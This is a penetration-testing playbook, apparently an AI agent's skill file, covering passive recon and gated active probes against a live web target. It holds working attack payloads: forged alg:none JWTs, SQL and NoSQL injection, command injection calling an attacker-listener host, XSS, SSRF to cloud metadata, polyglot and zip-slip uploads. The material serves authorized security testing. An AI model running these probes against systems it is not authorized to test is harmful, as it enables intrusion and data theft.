# Live Testing Playbook

This file is the playbook for probing a live target. It's split into two tiers:

- **Passive** — observation only, no abnormal payloads. Allowed once initial authorization is confirmed.
- **Active** — sends crafted payloads to test for vulnerabilities. Requires per-class confirmation per the authorization gate in SKILL.md.

Every probe in this file has a manual `curl`-based form. Tool-assisted alternatives are noted where useful.

**Always capture full request and response** for every probe. Save raw HTTP exchanges in the audit folder (`evidence/<finding-id>/req-<n>.http` and `resp-<n>.http`) — these become evidence in findings.

---

## Tier 1 — Passive

### Headers & cookies

```bash
TARGET=https://target.example.com

# Full headers, response truncated
curl -sv "$TARGET/" 2>&1 | sed -n '/^< /p' | head -60

# Common pages
for path in / /login /api /api/v1 /admin /robots.txt /sitemap.xml /.well-known/security.txt /api/health; do
  echo "=== $path ==="
  curl -sk -o /dev/null -w "  status: %{http_code}\n  size: %{size_download}\n  redirect: %{redirect_url}\n" "$TARGET$path"
done
```

**What to look for in headers:**
- `Server`, `X-Powered-By`, `X-AspNet-Version`, `X-Runtime` — fingerprinting & version disclosure
- Missing: `Strict-Transport-Security`, `Content-Security-Policy`, `X-Frame-Options` (or `frame-ancestors` in CSP), `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`
- Permissive: `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (impossible per spec but some servers allow)
- `Set-Cookie`: every cookie should have `Secure`, `HttpOnly` (for session/auth), `SameSite` set explicitly
- Timing headers (`Server-Timing`) sometimes leak backend internals

### TLS

```bash
# Quick check
echo | openssl s_client -connect target.example.com:443 -servername target.example.com 2>/dev/null \
  | openssl x509 -noout -text | head -80

# Comprehensive (if testssl.sh available)
testssl.sh --quiet --color 0 https://target.example.com
```

**Look for:** SSLv3, TLS 1.0, TLS 1.1 enabled; weak ciphers (RC4, 3DES, NULL, EXPORT); missing OCSP stapling; expired/short-validity certs; wildcard certs covering more than expected.

### Info disclosure paths

```bash
TARGET=https://target.example.com
for path in \
  /.git/HEAD /.git/config /.svn/entries /.hg/store \
  /.env /.env.local /.env.production \
  /config.json /config.yml /appsettings.json \
  /package.json /composer.json /Gemfile /requirements.txt \
  /server-status /server-info \
  /phpinfo.php /info.php /test.php \
  /actuator /actuator/env /actuator/heapdump /actuator/health \
  /api-docs /swagger /swagger-ui /openapi.json /openapi.yaml /v2/api-docs /v3/api-docs \
  /__debug__/ /debug /trace \
  /backup.sql /backup.zip /db.sqlite \
  /.DS_Store /thumbs.db \
  /admin /administrator /wp-admin /wp-login.php; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" -L --max-redirs 0 "$TARGET$path")
  if [ "$status" != "404" ] && [ "$status" != "000" ]; then
    echo "$status  $path"
  fi
done
```

Anything 200 or 401 (especially) needs a closer look — 401 confirms the path exists.

### Endpoint discovery from the SPA bundle

```bash
# Get the index, extract bundle URLs
curl -s "$TARGET/" -o /tmp/index.html
grep -oE 'src="[^"]+\.js[^"]*"' /tmp/index.html | sed 's/src="//;s/"$//' | while read url; do
  # Resolve relative URLs
  full_url="$TARGET${url#/}"
  curl -s "$full_url" -o /tmp/bundle.js

  # Extract API paths
  echo "=== $url ==="
  grep -oE '"(/(api|v[0-9]+)/[^"]+)"' /tmp/bundle.js | sort -u | head -30

  # Extract embedded keys / suspicious strings
  grep -oE '"(AKIA|sk_live|sk_test|ghp_|xoxb|eyJ)[A-Za-z0-9_-]{20,}"' /tmp/bundle.js | sort -u
done
```

### Authenticated baseline (if creds provided)

Log in, capture the session/token, then walk the app as a normal user:
- Browse 5-10 pages, capturing requests
- Note every endpoint hit, every parameter, every state change
- Identify roles available (regular, admin, etc.) — request elevated creds if not already provided

This baseline tells you what *normal* looks like. Deviations from it during active testing are signals.

---

## Tier 2 — Active

**Before each test class, confirm with the user:**

```
Ready to start active testing class: <class>.

This will send <description of probes>. Risks:
- <specific risk for this class on this target>

Show me the first probe before sending? (recommended) — or proceed to multi-probe?
```

For destructive risks (mass assignment, SSRF to internal mutating endpoints, file uploads that overwrite, brute force), **always** show probes first.

The classes below are organized by test goal, not by OWASP category — categories overlap and don't map cleanly to a probe.

---

### Class: auth-bypass

**Goal:** prove the auth perimeter is broken.

**Probes (least to most invasive):**

1. **Reachability of authenticated endpoints unauthenticated:**
   ```bash
   # Take an endpoint you confirmed needs auth, send without token
   curl -sv "$TARGET/api/users/me" -o /dev/null -w "%{http_code}\n"
   # Expected: 401. Bug if 200, 500, or redirect to a page that returns sensitive data.
   ```

2. **JWT manipulation** (if JWT in use):
   ```bash
   # Decode current token
   TOKEN="eyJ..."
   echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

   # Try alg:none — works on old/misconfigured implementations
   HEADER='{"alg":"none","typ":"JWT"}'
   PAYLOAD='{"sub":"1","role":"admin","exp":9999999999}'
   FORGED="$(echo -n "$HEADER" | base64 | tr -d '=' | tr '/+' '_-').$(echo -n "$PAYLOAD" | base64 | tr -d '=' | tr '/+' '_-')."
   curl -sv -H "Authorization: Bearer $FORGED" "$TARGET/api/users/me"

   # Try alg:HS256 with the public key as secret (RS→HS confusion)
   # Requires the public key from JWKS endpoint
   ```

3. **Session fixation / regeneration:**
   ```bash
   # Get an unauthenticated cookie
   curl -sk -c /tmp/pre.jar "$TARGET/login" >/dev/null
   PRE=$(grep -oE 'sessionid\s+[^\s]+' /tmp/pre.jar | awk '{print $NF}')

   # Log in (using whatever the login flow is) reusing the same cookie jar
   curl -sk -b /tmp/pre.jar -c /tmp/post.jar -X POST "$TARGET/api/login" \
     -H 'Content-Type: application/json' \
     -d '{"email":"...","password":"..."}'
   POST=$(grep -oE 'sessionid\s+[^\s]+' /tmp/post.jar | awk '{print $NF}')

   if [ "$PRE" = "$POST" ]; then
     echo "FINDING: session ID not regenerated on login (fixation)"
   fi
   ```

4. **Username enumeration via login response or timing:**
   ```bash
   # Compare error messages for known-bad-user vs known-good-user with wrong pass
   for user in "admin" "doesnotexist_$RANDOM"; do
     time curl -sk -X POST "$TARGET/api/login" \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"$user@example.com\",\"password\":\"wrongpass\"}" \
       -w "  %{http_code}  %{time_total}s\n" -o /tmp/resp
     echo "=== $user response ==="
     cat /tmp/resp
   done
   ```
   Same response body + similar timing = no enumeration. Differences = finding.

5. **Password reset flow:**
   - Request reset for a known account
   - Inspect the reset link: predictable token? Long enough? Tied to user?
   - Use the token, then try again — should be invalidated
   - Inspect the reset email link host — is it controlled by a `Host:` header from the request? (Host header injection)
     ```bash
     curl -sk -X POST "$TARGET/api/password-reset" \
       -H 'Host: evil.example.com' \
       -H 'Content-Type: application/json' \
       -d '{"email":"victim@example.com"}'
     # Then check the email — does the reset link point to evil.example.com?
     ```

---

### Class: access-control (IDOR / BFLA)

**Goal:** prove a user can access another user's resources or perform admin functions.

**Setup:** you need at least two accounts, ideally one regular + one admin. Capture both sets of cookies/tokens.

```bash
# Create a resource as user A
RESP=$(curl -sk -H "Authorization: Bearer $TOKEN_A" -X POST "$TARGET/api/notes" \
  -H 'Content-Type: application/json' -d '{"title":"A note"}')
RESOURCE_ID=$(echo "$RESP" | jq -r .id)

# Try to access it as user B
curl -sv -H "Authorization: Bearer $TOKEN_B" "$TARGET/api/notes/$RESOURCE_ID"
# Expected: 403 or 404. Bug: 200 with the note contents.

# Try to modify it as user B
curl -sv -H "Authorization: Bearer $TOKEN_B" -X PATCH "$TARGET/api/notes/$RESOURCE_ID" \
  -H 'Content-Type: application/json' -d '{"title":"hijacked"}'

# Try to delete it as user B
curl -sv -H "Authorization: Bearer $TOKEN_B" -X DELETE "$TARGET/api/notes/$RESOURCE_ID"
```

**BFLA (function-level):**
```bash
# Try admin endpoints as a regular user
for path in /api/admin/users /api/admin/audit /api/admin/settings /api/users/all; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN_REGULAR" "$TARGET$path")
  echo "$status  $path"
done
```

**Tenant isolation (multi-tenant apps):**
- Get a resource ID from tenant A
- Authenticate as a user in tenant B
- Try to access tenant A's resource

**Numeric / sequential IDs:** if IDs are integers, walk them and check responses. Even 404 responses leak existence vs nonexistence in subtle ways (timing, error codes, body length).

---

### Class: injection (SQL / NoSQL / command / template)

**Goal:** prove the application interprets user input as code/query.

**SQLi probe sequence:**

1. **Boolean-based detection** (safe, just true/false comparison):
   ```bash
   BASE="$TARGET/api/products?id=1"
   TRUE_RESP=$(curl -sk "$BASE")
   AND_TRUE=$(curl -sk "$BASE%20AND%201%3D1--")
   AND_FALSE=$(curl -sk "$BASE%20AND%201%3D2--")

   # If TRUE_RESP == AND_TRUE != AND_FALSE → SQLi confirmed
   ```

2. **Error-based detection:**
   ```bash
   # Inject syntax-breaking chars and look for DB error in response
   curl -sk "$TARGET/api/products?id=1'" | grep -iE 'sql|syntax|mysql|postgres|sqlite|odbc|database error'
   ```

3. **Time-based** (last resort, slowest):
   ```bash
   # Postgres
   time curl -sk "$TARGET/api/products?id=1;SELECT%20pg_sleep(5)--"
   # MySQL
   time curl -sk "$TARGET/api/products?id=1%20AND%20SLEEP(5)--"
   # MSSQL
   time curl -sk "$TARGET/api/products?id=1;WAITFOR%20DELAY%20'0:0:5'--"
   ```

4. **Hand off to sqlmap for confirmation** (with explicit user OK):
   ```bash
   sqlmap -u "$TARGET/api/products?id=1" --batch --risk=1 --level=2 \
     --headers="Authorization: Bearer $TOKEN" \
     --output-dir=./security-audit-*/evidence/sqlmap
   ```

**NoSQL injection (Mongo):**
```bash
# Operator injection in JSON body
curl -sk -X POST "$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","password":{"$ne":""}}'
# Auth bypass if app passes req.body fields directly to Mongoose .findOne
```

**Command injection:**
```bash
# Test fields likely to hit a shell — file conversion, ping, hostname lookup, etc.
# OOB with a unique callback if you control a listener
PAYLOAD='1; nslookup unique-id-$(date +%s).attacker-listener.example.com'
curl -sk -X POST "$TARGET/api/diagnostics" --data-urlencode "host=$PAYLOAD"
# Then check listener for DNS hits
```
**Note:** OOB testing requires an external listener you control. Skip this class probe if you don't have one set up. In-band detection: append `; sleep 5` and time the response.

**SSTI (template injection):**
```bash
# Reflected user input, no interpretation? Inject template syntax.
# Jinja2 / Twig:
curl -sk "$TARGET/search?q={{7*7}}"
# Look for "49" in response

# ERB (Rails):  <%= 7*7 %>
# Handlebars:   {{this}}
# FreeMarker:   ${7*7}
# Thymeleaf:    *{T(java.lang.Runtime).getRuntime()...}
```

---

### Class: xss

**Goal:** prove an attacker-controlled value executes script in another user's browser.

**Reflected probes (escalate):**

```bash
# 1. Probe whether the value is reflected at all
curl -sk "$TARGET/search?q=PROBE_UNIQUE_$RANDOM" | grep "PROBE_UNIQUE"

# 2. If reflected, check if special chars are encoded
curl -sk "$TARGET/search?q=%3Cs%3E%22%27%26" | grep -oE '<s>|&lt;s&gt;|&#60;s&#62;|"|&quot;|&#34;'
# If you see <s> intact in HTML context, XSS likely

# 3. Build payload appropriate to context (HTML, attribute, JS, URL)
# HTML body context:
curl -sk "$TARGET/search?q=%3Csvg%2Fonload%3Dalert(1)%3E"
# Attribute context (escape the attribute first):
curl -sk "$TARGET/search?q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E"
# JS string context:
curl -sk "$TARGET/search?q=';alert(1);//"
```

**Stored XSS:**
- Find every input that gets persisted and rendered to other users (comments, profile fields, names, descriptions, bios)
- Submit a unique probe (`<x-probe-12345>`)
- View the rendered output as another user (or same user different page)
- If reflected unencoded → XSS. Test payload escalation only with explicit user OK on production data.

**DOM XSS:**
- Open the SPA, look for code that pulls from `location.hash`, `location.search`, `postMessage`, `window.name`
- Test by changing hash/query and observing `document.body.innerHTML` for unsanitized injection
- A headless browser (`playwright`) is sometimes the only way to confirm this — describe what you'd test if you can't run one

**CSP bypass check:** if CSP is present, evaluate whether it actually blocks discovered XSS:
```bash
curl -sI "$TARGET/" | grep -i 'content-security-policy'
# If `unsafe-inline`, `unsafe-eval`, or wildcards present, CSP probably won't help
```

---

### Class: ssrf

**SSRF is high-impact and high-risk.** Stop and check with the user before testing internal IP ranges — you may pull data from internal services.

**Discovery — find SSRF surface:**
- Any endpoint that accepts a URL: webhook config, image fetch, profile picture URL, "import from URL", URL preview/unfurling, OAuth/SSO callback, RSS/Atom fetch
- Any endpoint that fetches based on user-supplied identifier (hostname, port, file path)

**Probes (escalating sensitivity):**

```bash
# 1. Confirm the server fetches at all — point at a controlled listener
curl -sk -X POST "$TARGET/api/preview" \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://your-listener.example.com/probe/'"$(date +%s)"'"}'
# Check listener for the request — confirms SSRF exists

# 2. Loopback (often blocked, sometimes not)
curl -sk -X POST "$TARGET/api/preview" -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1/"}'
curl -sk -X POST "$TARGET/api/preview" -H 'Content-Type: application/json' \
  -d '{"url":"http://localhost/"}'

# 3. Cloud metadata (AWS, GCP, Azure) — high-risk, ask user first
# AWS IMDSv1
curl -sk -X POST "$TARGET/api/preview" -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
# AWS IMDSv2 requires PUT for token, often unreachable via SSRF
# GCP
curl -sk -X POST "$TARGET/api/preview" -H 'Content-Type: application/json' \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/","headers":{"Metadata-Flavor":"Google"}}'

# 4. Internal network probing — VERY risky, requires explicit user OK
# Common internal subnets: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
```

**Bypasses to try if simple probes are blocked:**
- DNS rebinding: `http://internal.attacker-controlled.com/` resolving twice (first to public IP, then to internal)
- URL parser confusion: `http://attacker.com#@127.0.0.1/`, `http://127.1/`, `http://0/`, `http://[::1]/`
- IP encoding: decimal `http://2130706433/`, octal, hex
- Schema variants: `gopher://`, `dict://`, `file://`, `ftp://`

---

### Class: file-upload

**Goal:** confirm file upload filters can be bypassed for stored XSS, RCE, or path traversal.

```bash
# 1. Upload a benign file and find where it's served from
curl -sk -X POST "$TARGET/api/avatar" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@benign.png"
# Note the returned URL/ID

# 2. Try unexpected types
# - Server-side script (PHP, JSP, ASPX) — RCE if served and executed
# - SVG — XSS via embedded JS, served from same origin
# - HTML — XSS, served from same origin
# - .htaccess — config override (Apache)
echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' > xss.svg
curl -sk -X POST "$TARGET/api/avatar" -H "Authorization: Bearer $TOKEN" -F "file=@xss.svg"

# 3. Bypass content-type checks with a "polyglot" — file with PNG header but PHP body
printf '\x89PNG\r\n\x1a\n<?php phpinfo(); ?>' > poly.png
curl -sk -X POST "$TARGET/api/avatar" -H "Authorization: Bearer $TOKEN" \
  -F "file=@poly.png;type=image/png"

# 4. Path traversal in filename
curl -sk -X POST "$TARGET/api/avatar" -H "Authorization: Bearer $TOKEN" \
  -F 'file=@evil.txt;filename=../../../tmp/escaped.txt'

# 5. Zip slip (if app accepts zips and extracts them)
# Build a zip with a path traversal entry
python3 -c "
import zipfile
with zipfile.ZipFile('slip.zip', 'w') as z:
    z.writestr('../../../tmp/pwned', 'pwned')
"
curl -sk -X POST "$TARGET/api/import" -H "Authorization: Bearer $TOKEN" -F "file=@slip.zip"
```

After upload, fetch the file URL and check what's served / executed.

---

### Class: brute-force

**Coordinate carefully** — brute force is loud, can lock accounts, and is usually visible to monitoring.

**Test for absence of rate limiting (rather than actual cracking):**

```bash
# Send 30 fast login attempts with intentionally wrong passwords
for i in $(seq 1 30); do
  status=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$TARGET/api/login" \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"test_account_$RANDOM@example.com\",\"password\":\"definitely_wrong_$i\"}")
  echo "$i  $status"
done
# All 200 or all 401 = no rate limiting. 429 after some N = rate limited.
```

**Apply the same probe to:**
- Password reset (token guessing)
- OTP / 2FA verification (code brute force)
- Coupon/promo code endpoints
- API key/token endpoints

**Don't:** target real user accounts. Use throwaway test accounts. Stop at the first sign of rate limiting or alerting.

---

### Class: csrf

**Goal:** prove a state-changing endpoint can be triggered cross-origin without a token.

```bash
# Find a state-changing endpoint (POST/PUT/PATCH/DELETE) used by the SPA
# Try invoking it WITHOUT the CSRF header/cookie pair the SPA normally sends
curl -sk -X POST "$TARGET/api/account/email" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@example.com"}' \
  --header 'Origin: https://evil.example.com'
# If it succeeds, no CSRF protection. If it fails, the protection works.
```

**SameSite consideration:** `SameSite=Lax` (Chrome's default) blocks CSRF for top-level POSTs. `SameSite=None` requires `Secure` and is CSRF-vulnerable without an explicit token.

---

### Class: race-conditions / TOCTOU

**Goal:** prove a critical operation can be performed multiple times when it should be once (e.g., redeem a one-time coupon, withdraw funds, claim a single resource).

```bash
# Fire 20 parallel identical requests
for i in $(seq 1 20); do
  curl -sk -X POST "$TARGET/api/redeem" \
    -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"code":"ONE_TIME_CODE"}' &
done
wait
# Check whether the coupon was redeemed once or N times
```

This is the kind of bug that pure code review can suggest but not confirm — only live concurrency proves it.

---

### Class: business-logic

These don't fit a category; they come from understanding what the app *does*. Examples:

- **Negative quantities** in checkout or transfer endpoints
- **Coupon stacking** beyond intended limits
- **State skip:** going from step 1 to step 5 of a checkout flow without steps 2-4
- **Role bleed:** changing your role via a profile update endpoint
- **Replay:** capturing a request to add yourself to an org and replaying it for other orgs
- **Email change without password:** if email is the recovery channel, this is a takeover primitive
- **Webhooks:** can you register a webhook on someone else's account? Can the webhook URL be a localhost?

There's no script for these — they come from reading the app's flows and asking "what happens if I do X out of order, with X out of range, X for someone else's resource?"

---

## Stopping conditions

Stop active testing immediately if:
- The user says stop
- A probe causes obvious unintended impact (account lockout cascade, 5xx storm, CPU spike on target)
- You're sending traffic to something out of scope (always re-confirm scope when in doubt)
- You're about to do something destructive without a recent explicit OK

When in doubt, ask before sending the next probe.
